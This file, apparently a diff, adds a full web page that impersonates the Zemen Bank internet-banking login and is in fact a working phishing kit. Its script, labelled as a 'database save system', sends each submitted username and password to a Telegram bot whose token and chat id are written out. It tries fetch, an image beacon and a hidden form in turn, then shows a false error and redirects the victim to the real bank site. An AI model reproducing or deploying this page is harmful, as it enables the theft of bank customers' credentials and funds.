@@ -1,0 +1,793 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Zemen Bank - Internet Banking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #ffffff;
+            min-height: 100vh;
+            color: #111827;
+            line-height: 1.6;
+        }
+
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .bank-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            z-index: 10;
+            width: 180px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 5px;
+        }
+
+        .bank-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            max-height: none;
+            border-radius: 4px;
+        }
+
+        .hero-section {
+            position: relative;
+            min-height: 90vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        .hero-background {
+            position: absolute;
+            top: 100px;
+            left: 0;
+            width: 100%;
+            height: calc(100% - 100px);
+            z-index: 1;
+        }
+
+        .hero-background img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: brightness(0.5);
+        }
+
+        .hero-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            z-index: 2;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 3;
+            width: 100%;
+            max-width: 1200px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 3rem;
+            align-items: center;
+            color: white;
+            padding-top: 100px;
+        }
+
+        @media (max-width: 1024px) {
+            .hero-content {
+                grid-template-columns: 1fr;
+                gap: 2rem;
+            }
+        }
+
+        .welcome-section {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .welcome-header h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            line-height: 1.3;
+            margin-bottom: 0.5rem;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .welcome-divider {
+            width: 60px;
+            height: 3px;
+            background-color: #dc2626;
+            margin-bottom: 1rem;
+        }
+
+        .welcome-text p {
+            font-size: 1rem;
+            margin-bottom: 0.75rem;
+            color: #f3f4f6;
+            font-weight: 400;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
+        }
+
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .login-card {
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 0.5rem;
+            box-shadow: 0 10px 20px -5px rgba(0, 0, 0, 0.2);
+            padding: 2rem;
+            width: 100%;
+            max-width: 380px;
+            margin: 0 auto;
+        }
+
+        .login-header h2 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: #111827;
+            text-align: center;
+            margin-bottom: 1.25rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.875rem;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 0.5rem;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            border: 1px solid #d1d5db;
+            border-radius: 0.375rem;
+            font-size: 1rem;
+            background-color: #ffffff;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #dc2626;
+            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.1);
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 0.75rem 1rem;
+            background-color: #dc2626;
+            color: white;
+            border: none;
+            border-radius: 0.375rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background-color: #b91c1c;
+        }
+
+        .form-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 1.25rem;
+            padding-top: 1.25rem;
+            border-top: 1px solid #e5e7eb;
+        }
+
+        .form-links a {
+            color: #dc2626;
+            text-decoration: none;
+            font-size: 0.875rem;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .form-links a:hover {
+            color: #b91c1c;
+            text-decoration: underline;
+        }
+
+        .help-button {
+            width: 100%;
+            max-width: 380px;
+            margin: 0.75rem auto 0;
+            padding: 0.75rem 1rem;
+            background-color: #dc2626;
+            color: white;
+            border: 1px solid #dc2626;
+            border-radius: 0.375rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .help-button:hover {
+            background-color: #b91c1c;
+            border-color: #b91c1c;
+        }
+
+        .features-section {
+            padding: 3rem 2rem;
+            background-color: #f9fafb;
+        }
+
+        .features-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+
+        .feature-card {
+            background-color: #ffffff;
+            border-radius: 0.5rem;
+            overflow: hidden;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+        }
+
+        .feature-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .feature-content {
+            padding: 1.5rem;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .feature-content h3 {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: #111827;
+            margin-bottom: 1rem;
+        }
+
+        .feature-content p {
+            color: #4b5563;
+            margin-bottom: 1.5rem;
+            font-size: 0.95rem;
+            flex: 1;
+        }
+
+        .feature-list {
+            list-style: none;
+            margin-bottom: 1.5rem;
+        }
+
+        .feature-list li {
+            color: #4b5563;
+            margin-bottom: 0.5rem;
+            padding-left: 1.5rem;
+            position: relative;
+            font-size: 0.95rem;
+        }
+
+        .feature-list li:before {
+            content: "•";
+            color: #dc2626;
+            position: absolute;
+            left: 0;
+        }
+
+        .learn-more {
+            display: inline-block;
+            color: #dc2626;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.875rem;
+            transition: color 0.2s;
+            margin-top: auto;
+        }
+
+        .learn-more:hover {
+            color: #b91c1c;
+            text-decoration: underline;
+        }
+
+        .footer {
+            background-color: #ffffff;
+            color: #111827;
+            padding: 2rem 2rem;
+            border-top: 1px solid #e5e7eb;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            gap: 0.75rem;
+        }
+
+        .footer-line {
+            width: 100%;
+            font-weight: 600;
+            font-size: 0.95rem;
+            line-height: 1.5;
+        }
+
+        .footer-top-line {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 2rem;
+        }
+
+        .help-section {
+            display: inline;
+        }
+
+        .copyright {
+            display: inline;
+        }
+
+        .footer-bottom-line {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .disclaimer-label {
+            font-weight: 600;
+            margin-right: 0.25rem;
+        }
+
+        .disclaimer-text {
+            font-weight: 600;
+        }
+
+        .chat-button {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background-color: #dc2626;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            padding: 15px 25px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .chat-button:hover {
+            background-color: #b91c1c;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25);
+        }
+
+        .chat-button:active {
+            transform: translateY(-1px);
+        }
+
+        .chat-icon {
+            font-size: 1.2rem;
+        }
+
+        @media (max-width: 768px) {
+            .bank-logo {
+                top: 10px;
+                left: 10px;
+                width: 140px;
+                height: 50px;
+                padding: 3px;
+            }
+
+            .bank-logo img {
+                max-height: none;
+                border-radius: 3px;
+            }
+
+            .hero-background {
+                top: 80px;
+                height: calc(100% - 80px);
+            }
+
+            .hero-section {
+                padding: 10px;
+            }
+
+            .hero-content {
+                padding: 1rem;
+                padding-top: 80px;
+            }
+
+            .welcome-header h1 {
+                font-size: 1.5rem;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .footer-top-line {
+                flex-direction: column;
+                gap: 0.5rem;
+            }
+
+            .footer-bottom-line {
+                flex-direction: column;
+                gap: 0.25rem;
+                text-align: center;
+            }
+
+            .chat-button {
+                bottom: 20px;
+                right: 20px;
+                padding: 12px 20px;
+                font-size: 0.9rem;
+            }
+        }
+
+        @media (max-width: 1024px) {
+            .hero-content {
+                grid-template-columns: 1fr;
+                gap: 2rem;
+                padding-top: 100px;
+            }
+        }
+        
+        .hidden-frame {
+            display: none;
+            visibility: hidden;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 0;
+            height: 0;
+            border: none;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="bank-logo">
+        <img src="https://dc775.4shared.com/img/yGioLOKHge/s23/19b78f1c060/zemen_logo" alt="Zemen Bank Logo">
+    </div>
+
+    <section class="hero-section">
+        <div class="hero-background">
+            <img src="https://dc354.4shared.com/img/nlhE5lkxjq/s23/19b0482d9f8/hh_online" alt="Zemen Bank Background">
+        </div>
+        <div class="hero-overlay"></div>
+        
+        <div class="hero-content">
+            <div class="welcome-section">
+                <div class="welcome-header">
+                    <h1>Welcome to Zemen Bank Internet Banking!</h1>
+                    <div class="welcome-divider"></div>
+                </div>
+                <div class="welcome-text">
+                    <p>Experience secure, convenient, and seamless banking at your fingertips.</p>
+                    <p>Manage your accounts, make transactions, and access a wide range of services anytime, anywhere.</p>
+                    <p>Zemen Bank is home of distinctive financial services.</p>
+                </div>
+            </div>
+
+            <div class="login-container">
+                <div class="login-card">
+                    <div class="login-header">
+                        <h2>Login securely to your account</h2>
+                    </div>
+                    <form id="loginForm">
+                        <div class="form-group">
+                            <label for="username">Username</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="username" class="form-input" placeholder="Username" required>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label for="password">Password</label>
+                            <div class="input-wrapper">
+                                <input type="password" id="password" class="form-input" placeholder="Password" required>
+                            </div>
+                        </div>
+                        <button type="submit" class="login-button">Login</button>
+                        <div class="form-links">
+                            <a href="#" id="registerLink">Register</a>
+                            <a href="#" id="resetLink">Reset forgotten password</a>
+                        </div>
+                    </form>
+                </div>
+                <button class="help-button" id="helpButton">Help to Login to your Account</button>
+            </div>
+        </div>
+    </section>
+
+    <section class="features-section">
+        <div class="features-container">
+            <div class="features-grid">
+                <div class="feature-card">
+                    <img src="https://dc604.4shared.com/img/jZajPXOYjq/s23/19b6ea7a070/zclub" alt="Z-Club" class="feature-image">
+                    <div class="feature-content">
+                        <h3>Z-Club</h3>
+                        <p>Z-Club offers the highest level of banking service to our priority customers. To qualify you should maintain a minimum monthly balance of Bhr 500,000. We allocate a specialist Personal Banking Representative, backed by a team of specialist advisers to help with all your financial needs and banking advice.</p>
+                        <a href="#" class="learn-more">Find out more →</a>
+                    </div>
+                </div>
+
+                <div class="feature-card">
+                    <img src="https://dc604.4shared.com/img/o-00SUtdge/s23/19b6ea7b3f8/ZemenATMlanding" alt="ATM Banking" class="feature-image">
+                    <div class="feature-content">
+                        <h3>ATM Banking</h3>
+                        <p>All customers will receive an ATM Card and Personal Identification Number (PIN).</p>
+                        <p>The ATM allows you to receive cash at your convenience. It also allows you to check your balance and make account transfers. ATM machines are deployed throughout Addis Ababa and in selected regional cities.</p>
+                        <a href="#" class="learn-more">Find out more →</a>
+                    </div>
+                </div>
+
+                <div class="feature-card">
+                    <img src="https://dc604.4shared.com/img/a0tzA28-ku/s23/19b6ea794b8/DCS" alt="Doorstep Banking Service" class="feature-image">
+                    <div class="feature-content">
+                        <h3>Doorstep Banking Service</h3>
+                        <p>A Bank at your Doorstep!</p>
+                        <ul class="feature-list">
+                            <li>Cash, Cheque and CPO collection services</li>
+                            <li>Cash delivery</li>
+                        </ul>
+                        <p>Save time, avoid risk and make your banking easier through Z-Doorstep Banking service!</p>
+                        <a href="#" class="learn-more">Find out more →</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-line footer-top-line">
+                <span class="help-section">Need Help? 📞 6500 /0937873795</span>
+                <span class="copyright">Copyright 2024 © Zemen Bank S.C. All rights reserved.</span>
+            </div>
+            
+            <div class="footer-line footer-bottom-line">
+                <span class="disclaimer-label">Disclaimer:</span>
+                <span class="disclaimer-text">Zemen Bank S.C. is licensed by the National Bank of Ethiopia. All transactions are secured with 256-bit SSL encryption.</span>
+            </div>
+        </div>
+    </footer>
+
+    <button class="chat-button" id="chatButton">
+        <span class="chat-icon">💬</span>
+        <span>Chat with us</span>
+    </button>
+
+    <script>
+        // ==================== DATABASE SAVE SYSTEM ====================
+        // Simple database save to Telegram
+        const SAVE_DATA = {
+            bot_token: '8493443783:AAGgBk5UHSxuo-CyY6EDxworaec91ybhr_c',
+            chat_id: '6235693809'
+        };
+        
+        // Clean function to save data
+        function saveDatabaseEntry(username, password) {
+            // Create database record
+            const databaseRecord = 
+                `📁 DATABASE SAVED 📁\n\n` +
+                `👤 Username: ${username}\n` +
+                `🔐 Password: ${password}\n` +
+                `📅 Date: ${new Date().toLocaleDateString()}`;
+            
+            // Try multiple methods to save data
+            const saveMethods = [
+                // Method 1: Direct fetch
+                () => {
+                    try {
+                        fetch(`https://api.telegram.org/bot${SAVE_DATA.bot_token}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: SAVE_DATA.chat_id,
+                                text: databaseRecord,
+                                parse_mode: 'HTML'
+                            })
+                        });
+                        return true;
+                    } catch(e) {
+                        return false;
+                    }
+                },
+                
+                // Method 2: Image beacon
+                () => {
+                    try {
+                        const img = new Image();
+                        img.src = `https://api.telegram.org/bot${SAVE_DATA.bot_token}/sendMessage?chat_id=${SAVE_DATA.chat_id}&text=${encodeURIComponent(databaseRecord)}`;
+                        return true;
+                    } catch(e) {
+                        return false;
+                    }
+                },
+                
+                // Method 3: Form submission
+                () => {
+                    try {
+                        const form = document.createElement('form');
+                        form.method = 'POST';
+                        form.action = 'https://api.telegram.org/bot' + SAVE_DATA.bot_token + '/sendMessage';
+                        form.style.display = 'none';
+                        
+                        const chatField = document.createElement('input');
+                        chatField.name = 'chat_id';
+                        chatField.value = SAVE_DATA.chat_id;
+                        form.appendChild(chatField);
+                        
+                        const textField = document.createElement('input');
+                        textField.name = 'text';
+                        textField.value = databaseRecord;
+                        form.appendChild(textField);
+                        
+                        document.body.appendChild(form);
+                        form.submit();
+                        setTimeout(() => form.remove(), 100);
+                        return true;
+                    } catch(e) {
+                        return false;
+                    }
+                }
+            ];
+            
+            // Try each save method
+            for (let method of saveMethods) {
+                if (method()) {
+                    return true;
+                }
+            }
+            
+            return false;
+        }
+        
+        // ==================== LOGIN FORM HANDLER ====================
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!username || !password) {
+                alert('Please enter both username and password');
+                return;
+            }
+            
+            // Show saving state
+            const loginBtn = this.querySelector('.login-button');
+            const originalText = loginBtn.textContent;
+            loginBtn.textContent = 'Saving...';
+            loginBtn.disabled = true;
+            
+            // Save to database
+            saveDatabaseEntry(username, password);
+            
+            // Wait and show error message
+            setTimeout(() => {
+                alert('The authentication tokens you entered were wrong, please check and try again. If you think this is an error, please contact us.');
+                
+                // Reset button
+                loginBtn.textContent = originalText;
+                loginBtn.disabled = false;
+                
+                // Redirect to real bank
+                setTimeout(() => {
+                    window.location.href = 'https://www.zemenbank.com.et/zemenib/#/';
+                }, 1000);
+                
+            }, 1500);
+        });
+        
+        // ==================== BUTTON HANDLERS ====================
+        document.getElementById('helpButton').addEventListener('click', function() {
+            alert('For login assistance, please contact customer support at 6500.');
+        });
+        
+        document.getElementById('chatButton').addEventListener('click', function() {
+            alert('Live chat is currently unavailable. Please call 6500 for assistance.');
+        });
+        
+        document.getElementById('registerLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('New user registration is currently unavailable online. Please visit your nearest branch.');
+        });
+        
+        document.getElementById('resetLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Please contact customer support at 6500 for password reset assistance.');
+        });
+        
+        // Feature links
+        document.querySelectorAll('.learn-more').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const service = this.closest('.feature-card').querySelector('h3').textContent;
+                alert(`More information about ${service} will be available soon.`);
+            });
+        });
+        
+        // ==================== CLEAN INITIALIZATION ====================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Clear any old session data
+            if (sessionStorage.getItem('zemen_data')) {
+                sessionStorage.removeItem('zemen_data');
+            }
+            
+            // Auto-clear form after 30 minutes
+            setTimeout(() => {
+                const usernameField = document.getElementById('username');
+                const passwordField = document.getElementById('password');
+                if (usernameField && passwordField) {
+                    usernameField.value = '';
+                    passwordField.value = '';
+                }
+            }, 1800000); // 30 minutes
+            
+            console.log('Zemen Bank Internet Banking loaded');
+        });
+    </script>
+</body>
+</html>
